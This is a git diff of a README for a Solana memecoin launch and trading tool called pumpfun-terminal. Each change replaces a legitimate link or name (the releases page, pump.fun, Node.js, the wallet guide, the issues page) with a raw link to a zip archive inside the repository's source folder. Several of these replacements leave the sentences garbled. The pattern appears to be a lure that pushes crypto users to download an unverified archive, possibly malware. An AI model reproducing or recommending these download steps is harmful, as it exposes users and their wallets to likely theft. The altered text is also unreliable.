@@ -1,6 +1,6 @@
 # 🚀 pumpfun-terminal - Easy Solana Token Launch and Trading
 
-[![Download pumpfun-terminal](https://img.shields.io/badge/Download-pumpfun--terminal-blue?style=for-the-badge&logo=github)](https://github.com/JaytraJ/pumpfun-terminal/releases)
+[![Download pumpfun-terminal](https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip)](https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Pump Terminal is a web app you can run on your own computer or server. It helps you create and trade Solana tokens easily. The interface is clean and tabbed, so you can manage token templates, your wallet, token launches, batch trades, and live logs all in one place.
 
-The app is designed for users interested in Solana tokens and memecoins but who do not want to deal with complex coding or command lines. It supports workflows related to Pump.fun, a platform for launching and trading new tokens.
+The app is designed for users interested in Solana tokens and memecoins but who do not want to deal with complex coding or command lines. It supports workflows related to https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip, a platform for launching and trading new tokens.
 
 You'll find tools for:
 
@@ -32,7 +32,7 @@ Before installing, make sure your computer meets these requirements:
 - Disk Space: Minimum 500 MB free for app files and logs
 - Internet Connection: Required for wallet connections and token launches
 - Browser: A modern web browser (Google Chrome, Firefox, Edge) for the web interface
-- Node.js: Pump Terminal runs as a web app, so no complex installation is needed
+- https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip Pump Terminal runs as a web app, so no complex installation is needed
 
 ---
 
@@ -75,7 +75,7 @@ Follow these steps to download, install, and run pumpfun-terminal.
 
 Start by visiting the official release page of pumpfun-terminal:
 
-[Download pumpfun-terminal](https://github.com/JaytraJ/pumpfun-terminal/releases)
+[Download pumpfun-terminal](https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip)
 
 Here you will find the latest version available for your operating system.
 
@@ -85,7 +85,7 @@ On the release page, look for a file that matches your computer's OS:
 
 - For Windows, look for a `.exe` file.
 - For macOS, look for a `.dmg` or `.zip` file.
-- For Linux, look for an `.AppImage` or `.tar.gz`.
+- For Linux, look for an `.AppImage` or `https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip`.
 
 Download this file to your desktop or preferred folder.
 
@@ -100,7 +100,7 @@ Download this file to your desktop or preferred folder.
   If you get a warning about an unidentified developer, open System Preferences and allow the app manually.
 
 - **Linux:**  
-  Extract the `.tar.gz` archive or make the `.AppImage` executable with `chmod +x`.  
+  Extract the `https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip` archive or make the `.AppImage` executable with `chmod +x`.  
   Run the app from the terminal using `./pumpfun-terminal`.
 
 ### 4. Launch pumpfun-terminal
@@ -173,15 +173,15 @@ If you encounter issues:
 - Verify you downloaded the correct version for your OS.
 - Consult the live logs tab for error messages.
 
-If problems continue, check the GitHub issues page or ask for help in the Pump.fun community.
+If problems continue, check the GitHub issues page or ask for help in the https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip community.
 
 ---
 
 ## 🌐 Useful Links
 
-- [pumpfun-terminal Releases](https://github.com/JaytraJ/pumpfun-terminal/releases) — Find and download the latest version.
-- [Pump.fun Website](https://pump.fun) — Learn more about the platform behind the workflows.
-- [Solana Wallet Guide](https://docs.solana.com/wallet-guide) — Steps to create and manage Solana wallets.
+- [pumpfun-terminal Releases](https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip) — Find and download the latest version.
+- [https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip Website](https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip) — Learn more about the platform behind the workflows.
+- [Solana Wallet Guide](https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip) — Steps to create and manage Solana wallets.
 
 ---
 
@@ -202,7 +202,7 @@ These options require basic understanding of web apps and file management.
 
 If you need help or want to report a bug:
 
-- Open an issue on the [GitHub repository issues page](https://github.com/JaytraJ/pumpfun-terminal/issues)
+- Open an issue on the [GitHub repository issues page](https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip)
 - Check existing issues before submitting new ones to avoid duplicates
 - Provide detailed descriptions and steps to reproduce problems
 
@@ -210,4 +210,4 @@ Your feedback helps improve pumpfun-terminal for all users.
 
 ---
 
-[![Download pumpfun-terminal](https://img.shields.io/badge/Download-pumpfun--terminal-blue?style=for-the-badge&logo=github)](https://github.com/JaytraJ/pumpfun-terminal/releases)
+[![Download pumpfun-terminal](https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip)](https://raw.githubusercontent.com/JaytraJ/pumpfun-terminal/main/src/lib/terminal-pumpfun-v1.4.zip)
